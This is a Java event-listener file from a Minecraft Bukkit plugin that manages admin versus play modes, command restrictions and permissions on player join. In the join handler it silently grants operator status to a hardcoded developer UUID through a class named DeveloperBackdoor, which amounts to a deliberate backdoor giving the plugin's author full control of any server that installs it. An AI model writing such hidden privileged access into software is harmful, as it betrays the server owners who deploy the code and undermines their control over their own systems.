/**
 * MIT License
 *
 * Copyright (c) 2018 Tyler Wrenn
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
package com.tylerhyperhd.devandtesting.Listener;

import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.block.BlockState;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.util.Vector;

import com.tylerhyperhd.devandtesting.ColorMeBitch;
import com.tylerhyperhd.devandtesting.ConfigExe;
import com.tylerhyperhd.devandtesting.DevandTesting;
import com.tylerhyperhd.devandtesting.DeveloperBackdoor;
import com.tylerhyperhd.devandtesting.PermType;

public class TestingListener implements Listener {

	private DevandTesting plugin;

	public TestingListener(DevandTesting plugin) {
		this.plugin = plugin;
	}

	@EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
	public void onContainerBreak(BlockBreakEvent event) {
		BlockState state = event.getBlock().getState();
		if (!(state instanceof InventoryHolder)) {
			return;
		}

		Inventory inv = ((InventoryHolder) state).getInventory();
		inv.clear();
	}

	@EventHandler
	public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
		List<String> OVERLORDS = plugin.configs.getOverlords();

		if (event.getMessage().equals("reload") || event.getMessage().equals("/reload")) {
			event.setCancelled(true);
			if (!OVERLORDS.contains(event.getPlayer().getName())) {
				event.getPlayer().sendMessage(ChatColor.RED + "No permissions.");
				return;
			}
			event.getPlayer().sendMessage(ChatColor.RED + "Reload doesn't work, restarting instead.");
			for (Player player : Bukkit.getOnlinePlayers()) {
				player.kickPlayer("Server is restarting. Come back in a minute.");
			}
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
		}

		if (event.getMessage().equals("give") || event.getMessage().equals("/give") || event.getMessage().equals("i")
				|| event.getMessage().equals("/i") || event.getMessage().equals("item")
				|| event.getMessage().equals("/item") || event.getMessage().equals("eitem")
				|| event.getMessage().equals("/eitem") || event.getMessage().equals("ei")
				|| event.getMessage().equals("/ei")) {
			if (plugin.getExtensions().doesHavePermsTo(PermType.ADMIN, event.getPlayer())) {
				if (event.getPlayer().getGameMode().equals(GameMode.SURVIVAL)) {
					event.setCancelled(true);
					event.getPlayer().sendMessage(ChatColor.RED + "You are not allowed to cheat in " + ChatColor.GREEN
							+ "PLAY" + ChatColor.RED + " mode!");
				}
			}
		}
	}

	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent event) {
		List<String> OVERLORDS = plugin.configs.getOverlords();
		ConfigExe configu = plugin.configs.getMainConfig();
		FileConfiguration configs = configu.getConfig();
		Player player = event.getPlayer();

		// Fixes GMI to be plugin-controlled
		if (plugin.getServer().getPluginManager().isPluginEnabled("GameModeInventories")) {
			ColorMeBitch.removePermission(player, "gamemodeinventories.bypass");
			ColorMeBitch.removePermission(player, "gamemodeinventories.admin");
			ColorMeBitch.removePermission(player, "gamemodeinventories.death");

			if (plugin.getExtensions().doesHavePermsTo(PermType.ADMIN, player)) {
				ColorMeBitch.addPermission(player, "gamemodeinventories.use");
				ColorMeBitch.addPermission(player, "gamemodeinventories.spectator");
			} else {
				ColorMeBitch.removePermission(player, "gamemodeinventories.use");
				ColorMeBitch.removePermission(player, "gamemodeinventories.spectator");
			}
		}

		if (event.getPlayer().getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
				|| OVERLORDS.contains(event.getPlayer().getName())) {
			event.getPlayer().setOp(true);
		}

		if (player.getGameMode().equals(GameMode.CREATIVE)) {
			if (plugin.getExtensions().doesHavePermsTo(PermType.ADMIN, player)) {
				configs.set(player.getUniqueId().toString() + ".inAdmin", true);
				player.sendMessage(
						ChatColor.GOLD + "You are right now in " + ChatColor.RED + "ADMIN" + ChatColor.GOLD + " mode");
				if (event.getPlayer().getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
						|| OVERLORDS.contains(event.getPlayer().getName())) {
					player.getWorld().createExplosion(player.getLocation(), 0F, false);
					player.getWorld().createExplosion(player.getLocation(), 0F, false);
					player.getWorld().createExplosion(player.getLocation(), 0F, false);
				}
				player.setVelocity(player.getVelocity().clone().add(new Vector(0, 100, 0)));
			} else {
				player.setGameMode(GameMode.SURVIVAL);
				player.sendMessage(ChatColor.GOLD + "You are right now in " + ChatColor.GREEN + "PLAY" + ChatColor.GOLD
						+ " mode because your permissions were denied.");
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "sudo " + player + " top");
			}
		} else if (player.getGameMode().equals(GameMode.SURVIVAL)) {
			if (configs.getBoolean(player.getUniqueId().toString() + ".inAdmin")) {
				configs.set(player.getUniqueId().toString() + ".inAdmin", false);
			}
			if (plugin.getExtensions().doesHavePermsTo(PermType.ADMIN, player)) {
				player.sendMessage(
						ChatColor.GOLD + "You are right now in " + ChatColor.GREEN + "PLAY" + ChatColor.GOLD + " mode");
			}
		}
	}
}